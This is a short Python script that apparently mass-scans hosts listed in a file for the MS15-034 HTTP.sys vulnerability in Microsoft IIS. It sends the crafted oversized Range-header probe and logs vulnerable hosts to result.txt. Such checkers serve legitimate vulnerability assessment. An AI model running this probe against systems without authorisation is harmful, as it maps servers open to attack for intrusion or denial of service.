
from importlib.resources import path
import socket
import sys

# try:
#     path=sys.argv[1]
# except:
#     print('python3 ms2.py url.txt')
#     sys.exit()

path = "./url.txt"

hexAllFfff = b"18446744073709551615"
req1 = b"GET / HTTP/1.0\r\n\r\n"
req = b"GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + b"\r\n\r\n"

success_url = []
with open(path,'r', encoding='utf-8') as f:
    f_read = f.readlines()
    for i in f_read:
        i = i.replace('\n','')
        try:
            port = int(i.split(':')[1])
            i = i.split(':')[0]
            # try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((i,port))
            s.send(req1)
            Resp = s.recv(1024)
            if b"Microsoft" not in Resp:
                print("[-] NOT IIS")
                # exit(0)
            else:
                V = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                V.settimeout(7)
                V.connect((i,port))
                V.send(req)
                V_Resp = V.recv(1024)
                if b"Requested Range Not Satisfiable" in V_Resp:
                    print("[*]M15_034 existence!")
                    success_url.append(i)
                elif b" The request has an invalid header name" in V_Resp:
                    print("[*] Not Vulnerability.")
                else:
                    print("[*] Unknown response state.")
                V.close()
            s.close()
            
        except Exception as e:
            print(e)

with open('result.txt','a') as s_f:
    for j in success_url:
        s_f.write(j)
        s_f.write('\n')
    s_f.close()